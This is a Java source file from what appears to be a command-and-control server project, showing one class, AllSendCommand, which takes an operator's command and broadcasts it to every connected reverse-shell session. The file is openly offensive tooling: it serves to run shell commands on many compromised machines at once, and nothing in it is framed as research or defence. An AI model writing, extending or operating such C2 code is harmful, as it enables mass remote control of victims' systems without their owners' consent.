package com.mtattab.c2cServer.service.commands.manager;

import com.mtattab.c2cServer.model.json.shell.ManagerCommunicationModel;
import com.mtattab.c2cServer.service.Command;
import com.mtattab.c2cServer.service.commands.connected.DefualtConnectedCommand;
import com.mtattab.c2cServer.util.ConnectionManager;
import com.mtattab.c2cServer.util.DataManipulationUtil;
import com.mtattab.c2cServer.util.SocketUtil;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;

import java.util.ArrayList;
import java.util.List;
import java.util.UUID;

public class AllSendCommand implements Command {
    @Override
    public void execute(List<String> args, WebSocketSession currentSocket) {
        args = new ArrayList<>(args);

        args .remove(0);

        if (args.isEmpty()){
            SocketUtil.sendMessage(currentSocket, new TextMessage(DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                    .msg("commands argument not found. Example Command: all /exit")
                    .success(false)
                    .build()
            )));

            return;
        }

        sendMessageToALlAgents(args,currentSocket);


    }


    private void sendMessageToALlAgents(List<String> args,  WebSocketSession currentSocket ){
        String mangerMessage = DataManipulationUtil.joinListWithDelimiter(args," ");
        DefualtConnectedCommand defualtConnectedCommand = new DefualtConnectedCommand();
        String uuid = UUID.randomUUID().toString();
        ConnectionManager.rerouteAllCommandToMangerSession.put(uuid,currentSocket);

        for (WebSocketSession activeReverseShellSession : ConnectionManager.activeReverseShellSessions) {
            defualtConnectedCommand.sendCommandToShell( mangerMessage , activeReverseShellSession, currentSocket, uuid);
        }

        SocketUtil.sendMessage(currentSocket, new TextMessage(DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                .msg("Sent Message to all agents")
                .success(true)
                .build()
        )));


    }
}
